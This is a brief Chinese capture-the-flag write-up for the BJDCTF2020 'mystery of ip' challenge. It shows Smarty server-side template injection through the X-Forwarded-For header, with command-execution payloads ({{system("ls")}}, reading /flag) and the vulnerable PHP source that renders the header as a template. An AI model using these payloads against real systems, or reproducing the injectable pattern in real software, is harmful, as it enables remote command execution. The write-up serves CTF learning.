### [BJDCTF2020]The mystery of ip

----

> 基于xff的模板注入
>
> 这个是php的smarty注入----可以通过{$smarty.version}查到版本

<img src="https://gitee.com/bx33661/image/raw/master/path/image-20241011173937368.png" style="zoom:50%;" />

抓包测试：

![2af3ad8b9abd9f3c8d2c2365664a4c4](https://gitee.com/bx33661/image/raw/master/path/2af3ad8b9abd9f3c8d2c2365664a4c4.png)

这个可以直接执行命令：

```
{{system("ls")}}
{{system(cat /flag)}}
```



题目源代码如下：

```php
<?php
    require_once('header.php');
    require_once('./libs/Smarty.class.php');
    $smarty = new Smarty();
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) 
    {
        $ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
        $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
        $ip=$_SERVER['REMOTE_ADDR'];
    }
    //$your_ip = $smarty->display("string:".$ip);
    echo "<div class=\"container panel1\">
                <div class=\"row\">
                <div class=\"col-md-4\">    
                </div>
            <div class=\"col-md-4\">
                <div class=\"jumbotron pan\">
                    <div class=\"form-group log\">
                        <label><h2>Your IP is : ";
    $smarty->display("string:".$ip);
    echo "            </h2></label>
                    </div>        
                </div>
            </div>
                <div class=\"col-md-4\">    
                </div>
                </div>
            </div>";
?>

```

